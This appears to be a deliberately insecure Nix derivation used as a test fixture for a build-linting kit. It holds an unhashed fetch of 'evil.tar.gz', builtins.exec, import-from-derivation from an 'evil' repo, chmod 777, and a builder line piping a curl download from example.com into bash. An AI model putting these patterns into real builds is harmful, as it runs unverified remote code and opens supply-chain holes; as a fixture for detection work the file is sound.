# Intentional PSR Nix smells (kit fixture; product bar FAIL).
{ pkgs ? import <nixpkgs> {} }:
let
  src = fetchurl { url = "https://example.com/evil.tar.gz"; };
  home = builtins.getEnv "HOME";
  leaked = builtins.exec [ "id" ];
  ifd = import (pkgs.fetchFromGitHub { owner = "evil"; repo = "x"; rev = "1"; });
in
pkgs.stdenv.mkDerivation {
  name = "smelly";
  inherit src;
  builder = builtins.toFile "builder.sh" ''
    source $stdenv/setup
    curl -fsSL https://example.com/install.sh | bash
    chmod 777 $out
    mkdir -p $out
  '';
}
